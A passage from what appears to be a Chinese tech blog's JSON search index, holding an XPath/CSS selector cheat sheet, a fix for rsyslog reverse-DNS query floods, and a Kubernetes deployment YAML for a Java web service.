\u0026lt;a\u0026gt; //a[last()] # last \u0026lt;a\u0026gt; //ol/li[2] # second \u0026lt;li\u0026gt; //ol/li[position()=2] # same as above //ol/li[position()\u0026gt;1] # :not(:first-of-type) Use [] with a number, or last() or position().\nChaining order a[1][@href=\u0026#39;/\u0026#39;] a[@href=\u0026#39;/\u0026#39;][1] Order is significant, these two are different.\nNesting predicates //section[.//h1[@id=\u0026#39;hi\u0026#39;]] This returns \u0026lt;section\u0026gt; if it has an \u0026lt;h1\u0026gt; descendant with id='hi'.\n#Functions Node functions name() # //[starts-with(name(), \u0026#39;h\u0026#39;)] text() # //button[text()=\u0026#34;Submit\u0026#34;] # //button/text() lang(str) namespace-uri() count() # //table[count(tr)=1] position() # //ol/li[position()=2] Boolean functions not(expr) # button[not(starts-with(text(),\u0026#34;Submit\u0026#34;))] String functions contains() # font[contains(@class,\u0026#34;head\u0026#34;)] starts-with() # font[starts-with(@class,\u0026#34;head\u0026#34;)] ends-with() # font[ends-with(@class,\u0026#34;head\u0026#34;)] concat(x,y) substring(str, start, len) substring-before(\u0026#34;01/02\u0026#34;, \u0026#34;/\u0026#34;) #=\u0026gt; 01 substring-after(\u0026#34;01/02\u0026#34;, \u0026#34;/\u0026#34;) #=\u0026gt; 02 translate() normalize-space() string-length() Type conversion string() number() boolean() #Axes Using axes //ul/li # ul \u0026gt; li //ul/child::li # ul \u0026gt; li (same) //ul/following-sibling::li # ul ~ li //ul/descendant-or-self::li # ul li //ul/ancestor-or-self::li # $(\u0026#39;ul\u0026#39;).closest(\u0026#39;li\u0026#39;) Steps of an expression are separated by /, usually used to pick child nodes. That’s not always true: you can specify a different “axis” with ::.\n// ul /child:: li Axis Step Axis Step Child axis # both the same //ul/li/a //child::ul/child::li/child::a child:: is the default axis. This makes //a/b/c work.\n# both the same # this works because `child::li` is truthy, so the predicate succeeds //ul[li] //ul[child::li] # both the same //ul[count(li) \u0026gt; 2] //ul[count(child::li) \u0026gt; 2] Descendant-or-self axis # both the same //div//h4 //div/descendant-or-self::h4 // is short for the descendant-or-self:: axis.\n# both the same //ul//[last()] //ul/descendant-or-self::[last()] Other axes Axis Abbrev Notes ancestor ancestor-or-self attribute @ @href is short for attribute::href child div is short for child::div descendant descendant-or-self // // is short for /descendant-or-self::node()/ namespace self . . is short for self::node() parent .. .. is short for parent::node() following following-sibling preceding preceding-sibling There are other axes you can use.\nUnions //a | //span Use | to join two expressions.\n#More examples Examples //* # all elements count(//*) # count all elements (//h1)[1]/text() # text of the first h1 heading //li[span] # find a \u0026lt;li\u0026gt; with an \u0026lt;span\u0026gt; inside it # ...expands to //li[child::span] //ul/li/.. # use .. to select a parent Find a parent //section[h1[@id=\u0026#39;section-name\u0026#39;]] Finds a \u0026lt;section\u0026gt; that directly contains h1#section-name\n//section[//h1[@id=\u0026#39;section-name\u0026#39;]] Finds a \u0026lt;section\u0026gt; that contains h1#section-name. (Same as above, but uses descendant-or-self instead of child)\nClosest ./ancestor-or-self::[@class=\u0026#34;box\u0026#34;] Works like jQuery’s $().closest('.box').\nAttributes //item[@price \u0026gt; 2*@discount] Finds \u0026lt;item\u0026gt; and check its attributes\n#References Xpath test bed (whitebeam.org) ","permalink":"https://rendoumi.com/posts/20240122-xpath_css_selector/","summary":"\u003cp\u003e最近在搞puppeteer的自动化，有很多地方需要用到CSS Selector，但是某些地方又是用Xpath方便，金手指放一下，备查：\u003c/p\u003e\n\u003ch3 id=\"test-queries-in-the-xpath-test-bed\"\u003eTest queries in the Xpath test bed:\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"http://www.whitebeam.org/library/guide/TechNotes/xpathtestbed.rhtm\"\u003eXpath test bed\u003c/a\u003e \u003cem\u003e(whitebeam.org)\u003c/em\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"browser-console\"\u003eBrowser console\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-js\" data-lang=\"js\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003e$x\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;//div\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eWorks in Firefox and Chrome.\u003c/p\u003e\n\u003ch2 id=\"selectors\"\u003e\u003ca href=\"https://devhints.io/xpath#selectors\"\u003e#\u003c/a\u003eSelectors\u003c/h2\u003e\n\u003ch3 id=\"descendant-selectors\"\u003eDescendant selectors\u003c/h3\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003e\u003ccode\u003eh1\u003c/code\u003e\u003c/th\u003e\n          \u003cth\u003e\u003ccode\u003e//h1\u003c/code\u003e\u003c/th\u003e\n          \u003cth\u003e\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003ediv p\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e`//div//p\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eul \u0026gt; li\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e`//ul/li\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eul \u0026gt; li \u0026gt; a\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e//ul/li/a\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003ediv \u0026gt; *\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e//div/*\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003e:root\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e`/\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003e:root \u0026gt; body\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e/body\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3 id=\"attribute-selectors\"\u003eAttribute selectors\u003c/h3\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003e\u003ccode\u003e#id\u003c/code\u003e\u003c/th\u003e\n          \u003cth\u003e\u003ccode\u003e//*[@id=\u0026quot;id\u0026quot;]\u003c/code\u003e\u003c/th\u003e\n          \u003cth\u003e\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003e.class\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e//*[@class=\u0026quot;class\u0026quot;]\u003c/code\u003e \u003cem\u003e…\u003ca href=\"https://devhints.io/xpath#class-check\"\u003ekinda\u003c/a\u003e\u003c/em\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003einput[type=\u0026quot;submit\u0026quot;]\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e//input[@type=\u0026quot;submit\u0026quot;]\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003ea#abc[for=\u0026quot;xyz\u0026quot;]\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e`//a[@id=\u0026ldquo;abc\u0026rdquo;][@for=\u0026ldquo;xyz\u0026rdquo;]\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003ea[rel]\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e//a[@rel]\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003ea[href^='/']\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e`//a[starts-with(@href, \u0026lsquo;/\u0026rsquo;)]\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003ea[href$='pdf']\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e//a[ends-with(@href, '.pdf')]\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003ea[href*='://']\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e//a[contains(@href, '://')]\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003ea[rel~='help']\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e//a[contains(@rel, 'help')]\u003c/code\u003e \u003cem\u003e…\u003ca href=\"https://devhints.io/xpath#class-check\"\u003ekinda\u003c/a\u003e\u003c/em\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3 id=\"order-selectors\"\u003eOrder selectors\u003c/h3\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003e\u003ccode\u003eul \u0026gt; li:first-of-type\u003c/code\u003e\u003c/th\u003e\n          \u003cth\u003e`//ul/li[1]\u003c/th\u003e\n          \u003cth\u003e\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eul \u0026gt; li:nth-of-type(2)\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e//ul/li[2]\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eul \u0026gt; li:last-of-type\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e//ul/li[last()]\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eli#id:first-of-type\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e`//li[1][@id=\u0026ldquo;id\u0026rdquo;]\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003ea:first-child\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e//*[1][name()=\u0026quot;a\u0026quot;]\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003ea:last-child\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e//*[last()][name()=\u0026quot;a\u0026quot;]\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3 id=\"siblings\"\u003eSiblings\u003c/h3\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003e\u003ccode\u003eh1 ~ ul\u003c/code\u003e\u003c/th\u003e\n          \u003cth\u003e`//h1/following-sibling::ul\u003c/th\u003e\n          \u003cth\u003e\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eh1 + ul\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e//h1/following-sibling::ul[1]\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eh1 ~ #id\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e//h1/following-sibling::[@id=\u0026quot;id\u0026quot;]\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3 id=\"jquery\"\u003ejQuery\u003c/h3\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003e\u003ccode\u003e$('ul \u0026gt; li').parent()\u003c/code\u003e\u003c/th\u003e\n          \u003cth\u003e`//ul/li/..\u003c/th\u003e\n          \u003cth\u003e\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003e$('li').closest('section')\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e//li/ancestor-or-self::section\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003e$('a').attr('href')\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e`//a/@href\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003e$('span').text()\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e//span/text()\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3 id=\"other-things\"\u003eOther things\u003c/h3\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003e\u003ccode\u003eh1:not([id])\u003c/code\u003e\u003c/th\u003e\n          \u003cth\u003e`//h1[not(@id)]\u003c/th\u003e\n          \u003cth\u003e\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eText match\u003c/td\u003e\n          \u003ctd\u003e`//button[text()=\u0026ldquo;Submit\u0026rdquo;]\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eText match (substring)\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e//button[contains(text(),\u0026quot;Go\u0026quot;)]\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eArithmetic\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e//product[@price \u0026gt; 2.50]\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eHas children\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e//ul[*]\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eHas children (specific)\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e//ul[li]\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eOr logic\u003c/td\u003e\n          \u003ctd\u003e`//a[@name or @href]\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003eUnion (joins results)\u003c/td\u003e\n          \u003ctd\u003e`//a | //div\u003c/td\u003e\n          \u003ctd\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3 id=\"class-check\"\u003eClass check\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e//div\u003cspan class=\"o\"\u003e[\u003c/span\u003econtains\u003cspan class=\"o\"\u003e(\u003c/span\u003econcat\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39; \u0026#39;\u003c/span\u003e,normalize-space\u003cspan class=\"o\"\u003e(\u003c/span\u003e@class\u003cspan class=\"o\"\u003e)\u003c/span\u003e,\u003cspan class=\"s1\"\u003e\u0026#39; \u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e,\u003cspan class=\"s1\"\u003e\u0026#39; foobar \u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eXpath doesn’t have the “check if part of space-separated list” operator, so this is the workaround (\u003ca href=\"http://pivotallabs.com/xpath-css-class-matching/\"\u003esource\u003c/a\u003e).\u003c/p\u003e","title":"Xpath金手指"},{"content":"网管检查流量图的时候发现，udp的流量很多\n看了看日志：\nJun 28 00:39:28 172.16.0.1 %ASA-6-305011: Built dynamic UDP translation from inside:172.16.36.2/2160 to outside:124.243.230.6/2160 Jun 28 00:39:28 172.16.0.1 %ASA-6-302015: Built outbound UDP connection 1369422617 for outside:223.5.5.5/53 (223.5.5.5/53) to inside:172.1... 发现一大堆是查询dns 53的\n杀了无关进程，继续，还有是那么多的udp 53 dns查询\n查了半天才发现，是rsyslog记录日志的时候反查ip的域名导致的，由于是内网域名都不对，所以ip查不到，就不停的往公网dns发查询，导致udp流量激增。\n知道原因就知道如何解决了\nCentos下，rsyslog增加-x -Q禁止解析的参数：\nvi /etc/sysconfig/rsyslog # Options for rsyslogd # Syslogd options are deprecated since rsyslog v3. # If you want to use them, switch to compatibility mode 2 by \u0026#34;-c 2\u0026#34; # See rsyslogd(8) for more details SYSLOGD_OPTIONS=\u0026#34;-c 5 -x -Q\u0026#34; Ubuntu下，方法一样，文件不一样\nvi /etc/defaults/rsyslog RSYSLOGD_OPTIONS=\u0026#34;-x -Q\u0026#34; 然后重启就可以了。\n","permalink":"https://rendoumi.com/posts/20240121-rsyslog_dns/","summary":"\u003cp\u003e网管检查流量图的时候发现，udp的流量很多\u003c/p\u003e\n\u003cp\u003e看了看日志：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eJun \u003cspan class=\"m\"\u003e28\u003c/span\u003e 00:39:28 172.16.0.1 %ASA-6-305011: Built dynamic UDP translation from inside:172.16.36.2/2160 to outside:124.243.230.6/2160  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eJun \u003cspan class=\"m\"\u003e28\u003c/span\u003e 00:39:28 172.16.0.1 %ASA-6-302015: Built outbound UDP connection \u003cspan class=\"m\"\u003e1369422617\u003c/span\u003e \u003cspan class=\"k\"\u003efor\u003c/span\u003e outside:223.5.5.5/53 \u003cspan class=\"o\"\u003e(\u003c/span\u003e223.5.5.5/53\u003cspan class=\"o\"\u003e)\u003c/span\u003e to inside:172.1...  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e发现一大堆是查询dns 53的\u003c/p\u003e\n\u003cp\u003e杀了无关进程，继续，还有是那么多的udp 53 dns查询\u003c/p\u003e\n\u003cp\u003e查了半天才发现，是rsyslog记录日志的时候反查ip的域名导致的，由于是内网域名都不对，所以ip查不到，就不停的往公网dns发查询，导致udp流量激增。\u003c/p\u003e\n\u003cp\u003e知道原因就知道如何解决了\u003c/p\u003e\n\u003cp\u003eCentos下，rsyslog增加-x -Q禁止解析的参数：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/sysconfig/rsyslog  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Options for rsyslogd\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Syslogd options are deprecated since rsyslog v3.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# If you want to use them, switch to compatibility mode 2 by \u0026#34;-c 2\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# See rsyslogd(8) for more details\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eSYSLOGD_OPTIONS\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;-c 5 -x -Q\u0026#34;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eUbuntu下，方法一样，文件不一样\u003c/p\u003e","title":"禁掉Rsyslog的dns解析"},{"content":"java业务上k8s的话，看到一篇比较好的文章，要注意的地方：\napiVersion: apps/v1 kind: Deployment metadata: name: java-web namespace: ops labels: app: java-web spec: selector: matchLabels: app: java-web replicas: 2 strategy: type: RollingUpdate template: metadata: name: java-web annotations: # 第一点：新增注解 loki.io/scrape: \u0026#39;true\u0026#39; # 抓取直接输出的日志到loki里 prometheus.io/path: /metrics #采集的监控地址 prometheus.io/port: \u0026#39;2112\u0026#39; #采集暴露的监控端口 prometheus.io/scrape: \u0026#39;true\u0026#39; #打开采集开关 labels: app: java-web spec: imagePullSecrets: # 第二点：添加权限 - name: my-docker #只有该用户才有pull镜像的权限 containers: - name: java-web image: hb.ops.top/ops/java-web:5917f92c imagePullPolicy: IfNotPresent readinessProbe: # 第三点：新增存活检测，当前是针对监控端口进行存活检测，也就是说只有当监控端口起来了，程序才算完全启动 httpGet: port: 2112 path: /metrics/prometheus initialDelaySeconds: 60 successThreshold: 1 failureThreshold: 3 timeoutSeconds: 5 startupProbe: httpGet: port: 2112 path: /metrics/prometheus initialDelaySeconds: 60 successThreshold: 1 failureThreshold: 3 timeoutSeconds: 5 livenessProbe: httpGet: port: 2112 path: /metrics/prometheus initialDelaySeconds: 60 successThreshold: 1 failureThreshold: 3 timeoutSeconds: 5 resources: # 第四点：设置资源限制，如果是java程序，建议limit比request大，这样可以合理分配堆内存和非堆内存 requests: memory: 1024Mi limits: memory: 2048Mi ports: - name: web-port containerPort: 8889 env: # 第五点：设置环境变量，可以设置时区，指定EVN环境，添加JAVA参数等 - name: JVM_OPTS value: -javaagent:/opt/skywalking/skywalking-agent.jar -Xmx1G -Xms1G - name: TZ value: Asia/Shanghai - name: APOLLO_LABEL value: gray - name: SW_AGENT_NAME value: \u0026#39;k8s-java-web\u0026#39; - name: SW_AGENT_COLLECTOR_BACKEND_SERVICES value: \u0026#39;10.0.0.123:11800\u0026#39; - name: ENV value: prod --- apiVersion: v1 kind: Service metadata: labels: app: java-web name: java-web namespace: ops spec: ports: - name: java-web-port port: 8889 protocol: TCP targetPort: 8889 nodePort: 30009 selector: app: java-web sessionAffinity: None type: NodePort status: loadBalancer: {} 上面忽略了启动命令，其实容器内的启动命令也是很有学问的。\n","permalink":"https://rendoumi.com/posts/20240119-k8s_java/","summary":"\u003cp\u003ejava业务上k8s的话，看到一篇比较好的文章，要注意的地方：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003eapiVersion\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eapps/v1\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003ekind\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eDeployment\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003emetadata\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ejava-web\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003enamespace\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eops\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003elabels\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003eapp\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ejava-web\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003espec\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003eselector\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003ematchLabels\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003eapp\u003c/span\u003e\u003cspan 